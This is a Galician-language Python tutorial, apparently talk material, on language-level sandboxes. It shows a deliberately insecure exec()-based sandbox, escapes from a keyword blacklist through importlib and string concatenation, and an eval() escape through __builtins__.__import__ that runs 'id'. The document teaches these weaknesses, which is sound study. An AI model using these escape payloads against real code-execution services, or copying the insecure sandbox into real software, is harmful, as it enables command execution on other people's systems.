# Inxección de código nunha sandbox

## Que é unha sandbox?

Unha sandbox é un entorno que nos permite executar código de forma controlada.

Neste caso "forma controlada" significa que se van a restrinxir certas funcionalidades da linguaxe para evitar que se
executen accions que poidan ser prexudiciales.

## Para que serve unha sandbox?

Unha sandbox serve para:
- **Executar código malicioso**. Para minimizar o risco de acabar co computador prexudicado.
- **Python na web**. Para probar codigo sen ter que instalar python.
- **Servicios na nube**. Para administrar os recursos de cómputo.

## Que tipo de sandboxes existen?

Existen dous tipos de sandboxes:
- A nivel de linguaxe. As restriccións aplícanse dende a propia linguaxe.
- A nivel de sistema operativo. As restriccións aplícanse dende o sistema operativo.

## Como se pode conseguir inxectar código nunha sandbox?

Para levar a cabo isto existen varios camiños e deperán de como esté implantada a sandbox:
- Blacklist de palabras chave. Para este tipo de inxeccións, unha posible forma de escapar da sandbox sería introducir 
unha suma de strings que, ao evaluarse, desen coma resultado a palabra blacklisteada.
- Utilizar a función `eval()` en vez da funcion `exec()` -a función `eval()` non permite a utilización da palabra
reservada `import` a cal serve para importar librarías-. Para este tipo de inxeccións hai que acceder dende os
`__builtins__` á función import e cargar o que nos conveña. 
- Borrar a función `__import__` do diccionario `__builtins__`. Para este tipo de inxeccións, hai que navegar pola árbore
de herencia de calquera obxecto ata chegar a unha clase que importe a libraría que nos interesa. Nota: esta inxección 
explícase con detalle na parte de Flask.

## Sandbox base

```python
class Sandbox:
    def __init__(self, globals=None, locals=None):
        self.globals = globals
        self.locals = locals

    def evalua(self, codigo):
        exec(codigo, self.globals, self.locals)


def main():
    sandbox = Sandbox()
    codigo = input("Codigo: ")
    sandbox.evalua(codigo)


if __name__ == "__main__":
    main()
```

## Exemplo. Blacklist de palabras chave

```python
class Sandbox:
    def __init__(self, globals=None, locals=None):
        self.globals = globals
        self.locals = locals

    def evalua(self, codigo):
        exec(codigo, self.globals, self.locals)


def main():
    sandbox = Sandbox()
    codigo = input("Codigo: ")
    if "subprocess" in codigo:
        print("Detectado intento de inxeccion de código")
        exit(0)
    sandbox.evalua(codigo)


if __name__ == "__main__":
    main()
```

Se se executa un `import subprocess; subprocess.run(['id'])` obtense o seguinte resultado:

```python
Detectado intento de inxeccion de código
```

Para evadir a resticción de blacklist de palabras chave, hai que converter a palabra `subprocess` nunha suma de strings
coma, por exemplo, `'subpr' + 'ocess'`. Por outra banda, en Python, non se pode facer un import dunha suma de strings 
directamente. Para conseguir isto pódese utilizar a libraría `importlib` a cal si que permite cargar librarías a partir
dun string. 

Co seguinte payload, podese cargar a libraría `subprocess` mediante unha suma de strings:

```python
import importlib; mod = importlib.import_module('subpr' + 'ocess'); mod.run(['id'])
```

e o resultado sería:

```pycon
uid=1000(guzman) gid=1000(guzman) grupos=1000(guzman)...
```

## Exemplo. Utilización de eval()

```python
class Sandbox:
    def __init__(self, globals=None, locals=None):
        self.globals = globals
        self.locals = locals

    def evalua(self, codigo):
        resultado = eval(codigo, self.globals, self.locals)
        print(resultado)


def main():
    sandbox = Sandbox()
    codigo = input("Codigo: ")
    sandbox.evalua(codigo)


if __name__ == "__main__":
    main()
```

Se se executa o seguinte codigo:

```python
import subprocess
subprocess.run(['id'])
```

obterase o seguinte resultado:

```pycon
Traceback (most recent call last):
  File "/home/guzman/Repositorios/pycones/02_Sandbox/exemplo_eval.py", line 19, in <module>
    main()
  File "/home/guzman/Repositorios/pycones/02_Sandbox/exemplo_eval.py", line 15, in main
    sandbox.evalua(codigo)
  File "/home/guzman/Repositorios/pycones/02_Sandbox/exemplo_eval.py", line 7, in evalua
    resultado = eval(codigo, self.globals, self.locals)
                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1
    import subprocess
    ^^^^^^
SyntaxError: invalid syntax
```

Para poder evadir a restricción, pódese acceder ao diccionario `__builtins__` -o cal contén as funcions mínimas de 
Python coma, por exemplo, `print`, `len`, `any`...-, ir a función `__import__`, cargar o módulo subprocess e executar a 
función que queremos.

O string co ataque quedaría da seguinte forma: 

```python
__builtins__.__import__('subprocess').run(['id'])
```

e o resultado sería:

```pycon
uid=1000(guzman) gid=1000(guzman) grupos=1000(guzman)...
CompletedProcess(args=['id'], returncode=0)
```

# Notas extra: o diccionario `__builtins__`

Este diccionario contén todas as funcións mínimas de python e como é un diccionario pódese modificar. Un exemplo disto 
sería borrar a función print mediante a liña `del __builtins__.print`

```pycon
>>> del __builtins__.print
>>> print('Ola mundo!')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
NameError: name 'print' is not defined
```
